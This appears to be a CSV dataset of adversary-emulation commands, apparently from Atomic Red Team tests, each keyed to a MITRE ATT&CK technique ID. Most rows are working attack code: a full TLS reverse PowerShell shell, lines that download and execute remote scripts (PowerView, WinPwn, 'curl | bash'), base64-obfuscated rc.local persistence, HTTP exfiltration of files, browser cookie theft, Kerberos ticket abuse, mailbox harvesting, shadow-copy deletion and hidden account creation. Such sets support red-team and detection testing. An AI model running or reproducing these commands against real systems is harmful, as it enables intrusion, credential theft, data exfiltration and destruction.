mitre_id,command
T1098,"$credfile = ""#{cred_file}"" if (test-path $credfile) { $cred = new-object -typename system.management.automation.pscredential -argumentlist $env:username, (get-content $credfile | convertto-securestring) if($cred.getnetworkcredential().password -eq ""#{new_password}""){ write-host -foregroundcolor yellow ""the new password is the same as the password stored in the credential file. please specify a different new password.""; exit -1 } try { $newpassword = convertto-securestring #{new_password} -asplaintext -force set-adaccountpassword -identity $env:username -oldpassword $cred.password -newpassword $newpassword } catch { $_.exception $errcode = $_.exception.errorcode write-host ""error code: $errcode"" if ($errcode -eq 86) { write-host -foregroundcolor yellow ""the stored password for the current user is incorrect. please run the prereq commands to set the correct credentials"" remove-item $credfile } exit $errcode } write-host -foregroundcolor cyan ""successfully changed the password to #{new_password}"" $newcred = new-object system.management.automation.pscredential ($env:username, $(convertto-securestring ""#{new_password}"" -asplaintext -force)) $newcred.password | convertfrom-securestring | out-file $credfile } else { write-host -foregroundcolor yellow ""you must store the password of the current user by running the prerequisite commands first"" }"
T1221,"START ""#{DOCX_FILE}"""
T1531,net user #{user_account} #{new_user_password} /add net.exe user #{user_account} #{new_password} # id_4736
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached # id_3180"
T1037,sudo cp #{path_startup_params} /library/startupitems/startupparameters.plist sudo cp #{path_malicious_script} /library/startupitems/atomic.sh sudo cp #{path_malicious_plist} /tmp/t1037_005_agent.plist /library/startupitems/atomic.sh start
T1202,"# copy command to clipboard set-clipboard -value '#{command}' # open run dialog start-process -filepath ""powershell"" -argumentlist ""-c (new-object -comobject 'shell.application').filerun()"" -windowstyle hidden # wait for run dialog to open start-sleep -seconds 1 # paste command and execute add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait('^v') start-sleep -milliseconds 500 [system.windows.forms.sendkeys]::sendwait('{enter}') # id_6786"
T1041,"if(-not (test-path #{filepath})){ 1..100 | foreach-object { add-content -path #{filepath} -value ""this is line $_."" } } [system.net.servicepointmanager]::expect100continue = $false $filecontent = get-content -path #{filepath} invoke-webrequest -uri #{destination_url} -method post -body $filecontent -disablekeepalive   "
T1530,aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name} # id_6972
T1037,"filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi [ ""$(uname)"" = 'freebsd' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local echo ""\npython3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibtb2rpznlpbmcgcmmubg9jywwgpiavdg1wl1qxmdm3ljawnc5yyy5sb2nhbccpcgo='))\"""" | sudo tee -a /etc/rc.local printf 'exit 0' | sudo tee -a /etc/rc.local sudo chmod +x /etc/rc.local"
T1546,echo '#{text_to_append}' >> /etc/profile # id_4068
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }"
T1114,"$SS = CONVERTTO-SECURESTRING ""#{PASSWORD}"" -ASPLAINTEXT -FORCE $CRED = NEW-OBJECT PSCREDENTIAL -ARGUMENTLIST '#{USERNAME}', $SS $PARAM = @{ CREDENTIAL = $CRED FORCE = $TRUE } $NULL = CONNECT-AZACCOUNT @PARAM $TOKEN = (GET-AZACCESSTOKEN -RESOURCETYPENAME MSGRAPH -ERRORACTION STOP).TOKEN $CERT = NEW-SELFSIGNEDCERTIFICATE -SUBJECT ""CN=POWERSHELL APPLICATION"" -CERTSTORELOCATION ""CERT:\CURRENTUSER\MY"" -KEYEXPORTPOLICY EXPORTABLE -KEYSPEC SIGNATURE -KEYLENGTH 2048 -KEYALGORITHM RSA -HASHALGORITHM SHA256 $REQRESOURCEACCESS = ( @{ ""RESOURCEACCESS"" = (@{""ID""= ""570282FD-FA5C-430D-A7FD-FC8DC98A9DCA""; ""TYPE""= ""SCOPE""}, @{ ""ID""= ""7427E0E9-2FBA-42FE-B0C0-848C9E6A8182""; ""TYPE""= ""SCOPE""}, @{""ID""= ""37F7F235-527C-4136-ACCD-4A02D197296E""; ""TYPE""= ""SCOPE""}, @{""ID""= ""14DAD69E-099B-42C9-810B-D002981FEEC1""; ""TYPE""= ""SCOPE""}, @{ ""ID""= ""E1FE6DD8-BA31-4D61-89E7-88639DA4683D""; ""TYPE""= ""SCOPE""}, @{ ""ID""= ""810C84A8-4A9E-49E6-BF7D-12D183F40D01""; ""TYPE""= ""ROLE""}); ""RESOURCEAPPID"" = ""00000003-0000-0000-C000-000000000000"" }) CONNECT-MGGRAPH -ACCESSTOKEN $TOKEN $CONTEXT = GET-MGCONTEXT $USERS = GET-MGUSER $APP = NEW-MGAPPLICATION -DISPLAYNAME ""T1114.002 ATOMIC TEST #1 - OFFICE365 - REMOTE EMAIL COLLECTION"" -REQUIREDRESOURCEACCESS $REQRESOURCEACCESS -WEB @{ REDIRECTURIS=""HTTP://LOCALHOST""; } -KEYCREDENTIALS @(@{ TYPE=""ASYMMETRICX509CERT""; USAGE=""VERIFY""; KEY=$CERT.RAWDATA }) NEW-MGSERVICEPRINCIPAL -APPID $APP.APPID -ADDITIONALPROPERTIES @{} | OUT-NULL $RESOURCESPN = GET-MGSERVICEPRINCIPAL -FILTER ""APPID EQ '$($APP.APPID)'"" $GRAPHAPIAPP = GET-MGSERVICEPRINCIPAL -FILTER ""DISPLAYNAME EQ 'MICROSOFT GRAPH'"" $MAILROLE = $GRAPHAPIAPP.APPROLES|WHERE-OBJECT VALUE -EQ ""MAIL.READ"" NEW-MGSERVICEPRINCIPALAPPROLEASSIGNMENT -SERVICEPRINCIPALID $RESOURCESPN.ID -PRINCIPALID $RESOURCESPN.ID -RESOURCEID $GRAPHAPIAPP.ID -APPROLEID $MAILROLE.ID $MAILBOX1 = ""#{1ST_TARGET_MAILBOX}"" $MAILBOX2 = ""#{2ND_TARGET_MAILBOX}"" $MAILBOX3 = ""#{3RD_TARGET_MAILBOX}"" [SYSTEM.COLLECTIONS.ARRAYLIST]$SELECTUSERS = @() FOREACH ($USER IN $USERS) {IF (($USER.MAIL -EQ $MAILBOX1) -OR ($USER.MAIL -EQ $MAILBOX2) -OR ($USER.MAIL -EQ $MAILBOX3)){$SELECTUSERS.ADD($USER.ID)}} CONNECT-MGGRAPH -CLIENTID $APP.APPID -TENANTID $CONTEXT.TENANTID -CERTIFICATENAME $CERT.SUBJECTNAME.NAME FOREACH ($USER IN $SELECTUSERS) { $URL= ""HTTPS://GRAPH.MICROSOFT.COM/V1.0/USERS/$($USER)/MESSAGES"" ; INVOKE-MGGRAPHREQUEST -URI $URL -METHOD GET -OUTPUTTYPE PSOBJECT}"
T1124,DATE
T1119,new-item -path $env:temp\t1119_powershell_collection -itemtype directory -force | out-null get-childitem -recurse -include *.doc | % {copy-item $_.fullname -destination $env:temp\t1119_powershell_collection}
T1046,docker build -t t1046 $pathtoatomicsfolder/t1046/src/ docker run --name t1046_container --rm -d -t t1046 docker exec t1046_container /scan.sh   
T1119,sc query type=service > %temp%\t1119_1.txt doskey /history > %temp%\t1119_2.txt wmic process list > %temp%\t1119_3.txt tree c:\atomicredteam\atomics > %temp%\t1119_4.txt
T1539,"$devtoolsport = 9222 $testurl = ""https://www.google.com"" stop-process -name ""chrome"" -force -erroraction silentlycontinue $chromeprocess = start-process ""chrome.exe"" ""$testurl --remote-debugging-port=$devtoolsport --profile-directory=default"" -passthru start-sleep 10 $jsonresponse = invoke-webrequest ""http://localhost:$devtoolsport/json"" -usebasicparsing $devtoolspages = convertfrom-json $jsonresponse.content $ws_url = $devtoolspages[0].websocketdebuggerurl $ws = new-object system.net.websockets.clientwebsocket $uri = new-object system.uri($ws_url) $ws.connectasync($uri, [system.threading.cancellationtoken]::none).wait() $get_all_cookies_request = '{""id"": 1, ""method"": ""network.getallcookies""}' $buffer = [system.text.encoding]::utf8.getbytes($get_all_cookies_request) $segment = new-object system.arraysegment[byte] -argumentlist $buffer, 0, $buffer.length $ws.sendasync($segment, [system.net.websockets.websocketmessagetype]::text, $true, [system.threading.cancellationtoken]::none).wait() $completemessage = new-object system.text.stringbuilder do { $receivedbuffer = new-object byte[] 2048 $receivedsegment = new-object system.arraysegment[byte] -argumentlist $receivedbuffer, 0, $receivedbuffer.length $result = $ws.receiveasync($receivedsegment, [system.threading.cancellationtoken]::none).result $receivedstring = [system.text.encoding]::utf8.getstring($receivedsegment.array, $receivedsegment.offset, $result.count) $completemessage.append($receivedstring) } while (-not $result.endofmessage) $ws.closeasync([system.net.websockets.websocketclosestatus]::normalclosure, ""closing"", [system.threading.cancellationtoken]::none).wait() try { $response = convertfrom-json $completemessage.tostring() $cookies = $response.result.cookies } catch { write-host ""error parsing json data."" } write-host $cookies stop-process $chromeprocess -force # id_5095"
T1195,"kubectl run #{pod_name} --image=#{image_name} --restart=never --attach --rm -i -- bash -lc ""mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install #{package_name} --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"""
T1482,[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/powershellmafia/powersploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/recon/powerview.ps1' -usebasicparsing); get-foresttrust -verbose # id_6812
T1622,"# check for common debugger processes $debuggerprocesses = get-process | where-object { $_.processname -match ""dbg"" -or $_.processname -match ""debug"" } # check for debugging flags $debuggingflags = [system.diagnostics.debugger]::isattached"
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')""   "
T1106,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/createprocess/get-createprocesssystembind.ps1') # id_6301
T1134,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/get-system-techniques/master/tokenmanipulation/get-winlogontokensystem.ps1');get-winlogontokensystem 
T1595,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"" "
T1552,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') sensitivefiles -noninteractive -consoleoutput
T1222,#{compiled_file} #{source_file}
T1074,"INVOKE-WEBREQUEST ""HTTPS://RAW.GITHUBUSERCONTENT.COM/REDCANARYCO/ATOMIC-RED-TEAM/MASTER/ATOMICS/T1074.001/SRC/DISCOVERY.BAT"" -OUTFILE #{OUTPUT_FILE}"
T1550,"& ""pathtoatomicsfolder\..\externalpayloads\psexec.exe"" -accepteula \\#{target} -w c:\ -c ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" asktgt /user:#{user_name} /password:#{password} /domain:#{domain} /outfile:ticket.kirbi set-location ""pathtoatomicsfolder\..\externalpayloads"" move-item -force ""\\#{target}\c$\ticket.kirbi"" ticket.kirbi write-host ""successfully retrieved tgt from '#{target}', now requesting a tgs from local"" & ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" asktgs /service:cifs/#{target} /ticket:ticket.kirbi /ptt remove-item ""pathtoatomicsfolder\..\externalpayloads\ticket.kirbi"" & ""pathtoatomicsfolder\..\externalpayloads\rubeus.exe"" purge"
T1091,"$removabledrives=@() $removabledrives = get-wmiobject -class win32_logicaldisk -filter ""drivetype=2"" | select-object -expandproperty deviceid foreach ($drive in $removabledrives) { write-host ""removable drive found:"" $drive new-item -path $drive/t1091test1.txt -itemtype ""file"" -force -value ""t1091 test 1 has created this file to simulate malware spread to removable drives."" }  "
T1040,sudo #{program_path} -f -i #{ifname} -t 3  
T1025,"powershell.exe -c ""get-volume | where-object {$_.drivetype -eq 'removable'} | foreach-object { get-childitem -path ($_.driveletter + ':\*') -recurse -include '*.doc*','*.xls*','*.txt','*.pdf' -erroraction silentlycontinue | foreach-object {write-output $_.fullname} } ; if (-not (get-volume | where-object {$_.drivetype -eq 'removable'})) { write-output 'no removable media.' }"" # id_8190"
T1110,"useradd -g sudo -s /bin/bash -p $(openssl passwd -1 password123) art su -c ""cd /tmp; curl -s #{remote_url} | bash"" art"
T1123,sh #{filename} #{audiofile} #{duration} # id_4375
T1003,"wmic /node:""#{target_host}"" shadowcopy call create volume=#{drive_letter}"
T1057,PS >> #{OUTPUT_FILE} PS AUX >> #{OUTPUT_FILE}
T1115,echo ifconfig | pbcopy $(pbpaste)
T1592,"get-ciminstance -query ""select * from win32_pnpentity where (pnpclass = 'image' or pnpclass = 'camera')"" "
T1033,[system.environment]::username | out-file -filepath .\currentactiveuser.txt $env:username | out-file -filepath .\currentactiveuser.txt -append # id_7659
T1125,reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestart /t reg_binary /d a273b6f07104d601 /f reg add hklm\software\microsoft\windows\currentversion\capabilityaccessmanager\consentstore\webcam\nonpackaged\c:#windows#temp#atomic.exe /v lastusedtimestop /t reg_binary /d 96ef514b7204d601 /f
T1573,"$SERVER_IP = #{SERVER_IP} $SERVER_PORT = #{SERVER_PORT} $SOCKET = NEW-OBJECT NET.SOCKETS.TCPCLIENT('#{SERVER_IP}', '#{SERVER_PORT}') $STREAM = $SOCKET.GETSTREAM() $SSLSTREAM = NEW-OBJECT SYSTEM.NET.SECURITY.SSLSTREAM($STREAM,$FALSE,({$TRUE} -AS [NET.SECURITY.REMOTECERTIFICATEVALIDATIONCALLBACK])) $SSLSTREAM.AUTHENTICATEASCLIENT('FAKEDOMAIN.EXAMPLE', $NULL, ""TLS12"", $FALSE) $WRITER = NEW-OBJECT SYSTEM.IO.STREAMWRITER($SSLSTREAM) $WRITER.WRITE('PS ' + (PWD).PATH + '> ') $WRITER.FLUSH() [BYTE[]]$BYTES = 0..65535|%{0}; WHILE(($I = $SSLSTREAM.READ($BYTES, 0, $BYTES.LENGTH)) -NE 0) {$DATA = (NEW-OBJECT -TYPENAME SYSTEM.TEXT.ASCIIENCODING).GETSTRING($BYTES,0, $I); $SENDBACK = (IEX $DATA | OUT-STRING ) 2>&1; $SENDBACK2 = $SENDBACK + 'PS ' + (PWD).PATH + '> '; $SENDBYTE = ([TEXT.ENCODING]::ASCII).GETBYTES($SENDBACK2); $SSLSTREAM.WRITE($SENDBYTE,0,$SENDBYTE.LENGTH);$SSLSTREAM.FLUSH()}"
T1195,"kubectl run #{pod_name} --image=#{image_name} --restart=never --attach --rm -i -- bash -lc ""mkdir -p /tmp/test && cd /tmp/test && npm init -y >/dev/null 2>&1 && echo '--- package.json before install ---' && cat package.json && npm install #{package_name} --no-audit --no-fund --no-package-lock && echo '--- package.json after install ---' && cat package.json"" # id_2526"
T1490,get-wmiobject win32_shadowcopy | foreach-object {$_.delete();}
T1573,"$server_ip = #{server_ip} $server_port = #{server_port} $socket = new-object net.sockets.tcpclient('#{server_ip}', '#{server_port}') $stream = $socket.getstream() $sslstream = new-object system.net.security.sslstream($stream,$false,({$true} -as [net.security.remotecertificatevalidationcallback])) $sslstream.authenticateasclient('fakedomain.example', $null, ""tls12"", $false) $writer = new-object system.io.streamwriter($sslstream) $writer.write('ps ' + (pwd).path + '> ') $writer.flush() [byte[]]$bytes = 0..65535|%{0}; while(($i = $sslstream.read($bytes, 0, $bytes.length)) -ne 0) {$data = (new-object -typename system.text.asciiencoding).getstring($bytes,0, $i); $sendback = (iex $data | out-string ) 2>&1; $sendback2 = $sendback + 'ps ' + (pwd).path + '> '; $sendbyte = ([text.encoding]::ascii).getbytes($sendback2); $sslstream.write($sendbyte,0,$sendbyte.length);$sslstream.flush()}  "
T1204,"INVOKE-WEBREQUEST #{PUA_URL} -OUTFILE #{PUA_FILE} & ""#{PUA_FILE}"""
T1020,"$filename = ""#{file}"" $url = ""#{domain}"" $file = new-item -force $filename -value ""this is art icedid botnet exfil test"" $contenttype = ""application/octet-stream"" try {invoke-webrequest -uri $url -method put -contenttype $contenttype -infile $filename} catch{}"
T1570,new-smbmapping -remotepath '#{remote_path}' -transporttype quic -skipcertificatecheck copy '#{local_file}' 'z:\' # id_9645
T1046,for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done
T1006,"$buffer = new-object byte[] 11 $handle = new-object io.filestream ""\\.\#{volume}"", 'open', 'read', 'readwrite' $handle.read($buffer, 0, $buffer.length) $handle.close() format-hex -inputobject $buffer  "
T1539,"osascript -e 'tell application ""finder""' -e 'set destinationfolderpath to posix file ""#{destination_path}""' -e 'set safarifolder to ((path to library folder from user domain as text) & ""containers:com.apple.safari:data:library:cookies:"")' -e 'duplicate file ""cookies.binarycookies"" of folder safarifolder to folder destinationfolderpath with replacing' -e 'end tell'"
T1564,net user $ atomic123! /add /active:yes
T1566,"# add user32.dll for keybd_event add-type @"" using system; using system.runtime.interopservices; public class k { [dllimport(""user32.dll"")] public static extern void keybd_event(byte bvk, byte bscan, uint dwflags, uintptr dwextrainfo); } ""@ # virtual key codes $vk_lwin, $vk_r, $keydown, $keyup = 0x5b, 0x52, 0x0000, 0x0002 # open run dialog (win+r) [k]::keybd_event($vk_lwin, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keydown, [uintptr]::zero) [k]::keybd_event($vk_r, 0, $keyup, [uintptr]::zero) [k]::keybd_event($vk_lwin, 0, $keyup, [uintptr]::zero) # short delay for run dialog start-sleep -milliseconds 500 add-type -assemblyname system.windows.forms [system.windows.forms.sendkeys]::sendwait(""cmd /c powershell -ec "" + [convert]::tobase64string([system.text.encoding]::unicode.getbytes('#{execution_command}')) + ""{enter}"") # id_6801"
T1595,"import-module ""pathtoatomicsfolder/t1595.003/src/webserverscan.ps1"" invoke-wordlistscan -target ""#{target}"" -wordlist ""#{wordlist}"" -timeout ""#{request_timeout}"" -outputfile ""#{output_file}"" write-host ""scan complete. results saved to: #{output_file}"""
